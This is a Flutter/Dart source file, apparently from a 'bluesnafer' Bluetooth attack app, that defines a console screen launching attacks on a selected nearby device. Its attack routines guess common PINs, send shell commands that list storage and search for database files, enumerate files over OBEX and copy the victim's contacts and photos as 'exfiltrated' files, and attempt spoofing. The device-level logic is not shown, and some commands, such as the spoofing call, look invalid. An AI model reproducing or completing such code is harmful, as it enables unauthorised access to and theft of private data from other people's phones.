import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'utils/device_utils.dart' as device_utils;

/// Pantalla de consola para mostrar ejecución de ataques en tiempo real
class AttackConsoleScreen extends StatefulWidget {
  final Map<String, dynamic> device;
  final String attackType;
  final Map<String, dynamic>? attackOptions;

  const AttackConsoleScreen({
    super.key,
    required this.device,
    required this.attackType,
    this.attackOptions,
  });

  @override
  State<AttackConsoleScreen> createState() => _AttackConsoleScreenState();
}

class _AttackConsoleScreenState extends State<AttackConsoleScreen> {
  static const platform = MethodChannel('com.bluesnafer_pro/bluetooth');
  static const logChannel = EventChannel('bluetooth_logs');
  static const progressChannel = EventChannel('attack_progress');

  StreamSubscription<dynamic>? _logSubscription;
  StreamSubscription<dynamic>? _progressSubscription;

  List<String> _consoleLogs = [];
  bool _isExecuting = false;
  double _progress = 0.0;
  String _currentStatus = 'Preparando ataque...';

  @override
  void initState() {
    super.initState();
    _initializeConsole();
    _startAttack();
  }

  @override
  void dispose() {
    _logSubscription?.cancel();
    _progressSubscription?.cancel();
    super.dispose();
  }

  void _initializeConsole() {
    // Escuchar logs en tiempo real
    _logSubscription = logChannel.receiveBroadcastStream().listen((logMessage) {
      setState(() {
        _consoleLogs.add(logMessage);
        // Mantener solo las últimas 100 líneas para evitar sobrecarga
        if (_consoleLogs.length > 100) {
          _consoleLogs = _consoleLogs.sublist(_consoleLogs.length - 100);
        }
      });
    });

    // Escuchar progreso del ataque
    _progressSubscription = progressChannel.receiveBroadcastStream().listen((progressData) {
      setState(() {
        _currentStatus = progressData['message'] ?? _currentStatus;
        _progress = (progressData['progress'] ?? 0.0).toDouble();
      });
    });
  }

  Future<void> _startAttack() async {
    setState(() {
      _isExecuting = true;
      _consoleLogs.clear();
      _progress = 0.0;
    });

    try {
      // Conectar al dispositivo primero
      await platform.invokeMethod('analyzeDevice', {
        'deviceAddress': widget.device['address'],
      });

      setState(() {
        _isExecuting = true;
        _consoleLogs.clear();
        _progress = 0.0;
      });

      // Ejecutar el ataque basado en el tipo
      await _executeAttack();

    } catch (e) {
      setState(() {
        _consoleLogs.add('❌ Error al iniciar ataque: $e');
        _isExecuting = false;
      });
    }
  }

  Future<void> _executeAttack() async {
    try {
      switch (widget.attackType) {
        case 'file_access':
          await _executeFileAccessAttack();
          break;
        case 'pin_bypass':
          await _executePinBypassAttack();
          break;
        case 'obex_exploit':
          await _executeOBEXExploit();
          break;
        case 'bluetooth_spoofing':
          await _executeBluetoothSpoofing();
          break;
        default:
          await _executeGenericAttack();
      }

      setState(() {
        _isExecuting = false;
      });

    } catch (e) {
      setState(() {
        _consoleLogs.add('❌ Error durante ejecución: $e');
        _isExecuting = false;
      });
    }
  }

  Future<void> _executeFileAccessAttack() async {
    final commands = [
      'ls -la /sdcard',
      'find /sdcard -name "*.db" -o -name "*.sqlite" | head -10',
      'cat /proc/version',
      'id',
    ];

    for (final cmd in commands) {
      try {
        await platform.invokeMethod('executeCommand', {
          'deviceAddress': widget.device['address'],
          'command': cmd,
        });

        // Pequeña pausa entre comandos
        await Future.delayed(const Duration(milliseconds: 500));
      } catch (e) {
        _consoleLogs.add('⚠️ Error en comando $cmd: $e');
      }
    }
  }

  Future<void> _executePinBypassAttack() async {
    final bypassAttempts = [
      '0000', '1111', '1234', '9999', '000000'
    ];

    for (final pin in bypassAttempts) {
      try {
        final result = await platform.invokeMethod('checkVulnerability', {
          'deviceAddress': widget.device['address'],
          'vulnerabilityCheck': 'PIN_BYPASS:$pin',
        });

        if (result.toString().contains('VULNERABLE')) {
          _consoleLogs.add('✅ PIN encontrado: $pin');
          break;
        } else {
          _consoleLogs.add('❌ PIN $pin incorrecto');
        }

        await Future.delayed(const Duration(milliseconds: 300));
      } catch (e) {
        _consoleLogs.add('⚠️ Error intentando PIN $pin: $e');
      }
    }
  }

  Future<void> _executeOBEXExploit() async {
    try {
      // Intentar enumerar archivos vía OBEX
      await platform.invokeMethod('enumerateFiles', {
        'deviceAddress': widget.device['address'],
        'path': '/sdcard',
      });

      // Intentar exfiltrar algunos archivos sensibles
      await platform.invokeMethod('exfiltrateMultipleFiles', {
        'deviceAddress': widget.device['address'],
        'fileMap': {
          '/sdcard/Download/contacts.vcf': '/tmp/contacts_exfiltrated.vcf',
          '/sdcard/DCIM/Camera/photo.jpg': '/tmp/photo_exfiltrated.jpg',
        }
      });

    } catch (e) {
      _consoleLogs.add('❌ Error en exploit OBEX: $e');
    }
  }

  Future<void> _executeBluetoothSpoofing() async {
    try {
      // Simular ataque de spoofing Bluetooth
      await platform.invokeMethod('executeCommand', {
        'deviceAddress': widget.device['address'],
        'command': 'bluetoothctl -- spoof ${widget.device['address']} new_device',
      });
    } catch (e) {
      _consoleLogs.add('❌ Error en spoofing: $e');
    }
  }

  Future<void> _executeGenericAttack() async {
    try {
      // Ataque genérico usando comandos del sistema
      await platform.invokeMethod('executeCommand', {
        'deviceAddress': widget.device['address'],
        'command': 'whoami && uname -a && df -h',
      });
    } catch (e) {
      _consoleLogs.add('❌ Error en ataque genérico: $e');
    }
  }

  void _retryAttack() {
    _startAttack();
  }

  void _stopAttack() {
    setState(() {
      _isExecuting = false;
      _consoleLogs.add('🛑 Ataque detenido por el usuario');
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0E21),
      appBar: AppBar(
        title: Text('Consola de Ejecución - ${device_utils.getDeviceDisplayName(widget.device)}'),
        backgroundColor: const Color(0xFF1D1E33),
        elevation: 0,
        actions: [
          if (_isExecuting)
            IconButton(
              icon: const Icon(Icons.stop, color: Colors.red),
              onPressed: _stopAttack,
              tooltip: 'Detener ejecución',
            ),
          if (!_isExecuting)
            IconButton(
              icon: const Icon(Icons.refresh, color: Colors.green),
              onPressed: _retryAttack,
              tooltip: 'Reintentar',
            ),
        ],
      ),
      body: Column(
        children: [
          // Estado del ataque
          _buildStatusCard(),

          // Consola de logs
          Expanded(
            child: Container(
              margin: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.black,
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: Colors.grey[700]!),
              ),
              child: Column(
                children: [
                  // Cabecera de la consola mejorada
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      gradient: const LinearGradient(
                        colors: [Color(0xFF1D1E33), Color(0xFF2D2E43)],
                        begin: Alignment.topCenter,
                        end: Alignment.bottomCenter,
                      ),
                      borderRadius: const BorderRadius.only(
                        topLeft: Radius.circular(8),
                        topRight: Radius.circular(8),
                      ),
                      border: Border.all(
                        color: Colors.white.withValues(alpha: 0x11),
                        width: 1,
                      ),
                    ),
                    child: Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(6),
                          decoration: BoxDecoration(
                            color: Colors.green.withValues(alpha: 0x22),
                            borderRadius: BorderRadius.circular(6),
                          ),
                          child: const Icon(Icons.terminal, color: Colors.green, size: 16),
                        ),
                        const SizedBox(width: 8),
                        const Text(
                          'CONSOLA DE EJECUCIÓN',
                          style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.bold,
                            fontSize: 14,
                          ),
                        ),
                        const Spacer(),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                          decoration: BoxDecoration(
                            color: Colors.white.withValues(alpha: 0x11),
                            borderRadius: BorderRadius.circular(12),
                          ),
                          child: Text(
                            '${_consoleLogs.length} líneas',
                            style: const TextStyle(color: Colors.white70, fontSize: 11),
                          ),
                        ),
                      ],
                    ),
                  ),

                  // Contenido de la consola
                  Expanded(
                    child: Container(
                      padding: const EdgeInsets.all(12),
                      child: _consoleLogs.isEmpty
                          ? const Center(
                              child: Text(
                                'Esperando logs...\n\nEl ataque comenzará automáticamente.',
                                style: TextStyle(color: Colors.grey, fontSize: 14),
                                textAlign: TextAlign.center,
                              ),
                            )
                          : ListView.builder(
                              itemCount: _consoleLogs.length,
                              itemBuilder: (context, index) {
                                final log = _consoleLogs[index];
                                return Container(
                                  padding: const EdgeInsets.symmetric(vertical: 2),
                                  child: Text(
                                    log,
                                    style: TextStyle(
                                      color: _getLogColor(log),
                                      fontSize: 12,
                                      fontFamily: 'monospace',
                                    ),
                                  ),
                                );
                              },
                            ),
                    ),
                  ),

                  // Barra de progreso si está ejecutando
                  if (_isExecuting)
                    Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        gradient: const LinearGradient(
                          colors: [Color(0xFF1D1E33), Color(0xFF2D2E43)],
                          begin: Alignment.topCenter,
                          end: Alignment.bottomCenter,
                        ),
                        borderRadius: const BorderRadius.only(
                          bottomLeft: Radius.circular(8),
                          bottomRight: Radius.circular(8),
                        ),
                        border: Border.all(
                          color: Colors.white.withValues(alpha: 0x11),
                          width: 1,
                        ),
                      ),
                      child: Column(
                        children: [
                          Container(
                            height: 6,
                            decoration: BoxDecoration(
                              color: Colors.grey[800],
                              borderRadius: BorderRadius.circular(3),
                            ),
                            child: ClipRRect(
                              borderRadius: BorderRadius.circular(3),
                              child: LinearProgressIndicator(
                                value: _progress,
                                backgroundColor: Colors.transparent,
                                valueColor: const AlwaysStoppedAnimation<Color>(Colors.green),
                              ),
                            ),
                          ),
                          const SizedBox(height: 8),
                          Row(
                            children: [
                              Container(
                                width: 8,
                                height: 8,
                                decoration: BoxDecoration(
                                  color: Colors.green,
                                  borderRadius: BorderRadius.circular(4),
                                ),
                              ),
                              const SizedBox(width: 8),
                              Expanded(
                                child: Text(
                                  _currentStatus,
                                  style: const TextStyle(
                                    color: Colors.white,
                                    fontSize: 12,
                                    fontWeight: FontWeight.w500,
                                  ),
                                ),
                              ),
                            ],
                          ),
                        ],
                      ),
                    ),
                ],
              ),
            ),
          ),

          // Botones de acción mejorados
          if (!_isExecuting)
            Container(
              padding: const EdgeInsets.all(16),
              child: Row(
                children: [
                  Expanded(
                    child: Container(
                      height: 50,
                      decoration: BoxDecoration(
                        gradient: const LinearGradient(
                          colors: [Colors.green, Color(0xFF4CAF50)],
                          begin: Alignment.centerLeft,
                          end: Alignment.centerRight,
                        ),
                        borderRadius: BorderRadius.circular(12),
                        boxShadow: [
                          BoxShadow(
                            color: Colors.green.withValues(alpha: 0x33),
                            blurRadius: 8,
                            offset: const Offset(0, 4),
                          ),
                        ],
                      ),
                      child: ElevatedButton.icon(
                        onPressed: _retryAttack,
                        icon: const Icon(Icons.play_arrow, size: 20),
                        label: const Text(
                          'REINTENTAR EJECUCIÓN',
                          style: TextStyle(fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 0.5),
                        ),
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent,
                          shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(width: 16),
                  Expanded(
                    child: Container(
                      height: 50,
                      child: OutlinedButton.icon(
                        onPressed: () => Navigator.of(context).pop(),
                        icon: const Icon(Icons.close, size: 20),
                        label: const Text(
                          'CERRAR CONSOLA',
                          style: TextStyle(fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 0.5),
                        ),
                        style: OutlinedButton.styleFrom(
                          foregroundColor: Colors.white70,
                          side: const BorderSide(color: Colors.white70, width: 1.5),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                          padding: const EdgeInsets.symmetric(vertical: 12),
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildStatusCard() {
    return Container(
      margin: const EdgeInsets.all(16),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: _isExecuting ? Colors.orange.withValues(alpha: 0x11) : Colors.green.withValues(alpha: 0x11),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(
          color: _isExecuting ? Colors.orange : Colors.green,
        ),
      ),
      child: Row(
        children: [
          Icon(
            _isExecuting ? Icons.warning : Icons.check_circle,
            color: _isExecuting ? Colors.orange : Colors.green,
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  _isExecuting ? 'Ejecutando ataque...' : 'Ataque completado',
                  style: TextStyle(
                    color: _isExecuting ? Colors.orange : Colors.green,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                Text(
                  _isExecuting ? _currentStatus : 'Todos los comandos ejecutados',
                  style: TextStyle(
                    color: _isExecuting ? Colors.orange : Colors.green,
                    fontSize: 12,
                  ),
                ),
              ],
            ),
          ),
          if (_isExecuting)
            const SizedBox(
              width: 20,
              height: 20,
              child: CircularProgressIndicator(
                strokeWidth: 2,
                color: Colors.orange,
              ),
            ),
        ],
      ),
    );
  }

  Color _getLogColor(String log) {
    if (log.contains('✅') || log.contains('✓') || log.contains('SUCCESS')) {
      return Colors.green;
    } else if (log.contains('❌') || log.contains('✗') || log.contains('ERROR') || log.contains('FAIL')) {
      return Colors.red;
    } else if (log.contains('⚠️') || log.contains('WARNING')) {
      return Colors.amber;
    } else if (log.contains('ℹ') || log.contains('INFO')) {
      return Colors.blue;
    } else if (log.contains('→') || log.startsWith('[')) {
      return Colors.grey;
    }
    return Colors.white;
  }
}
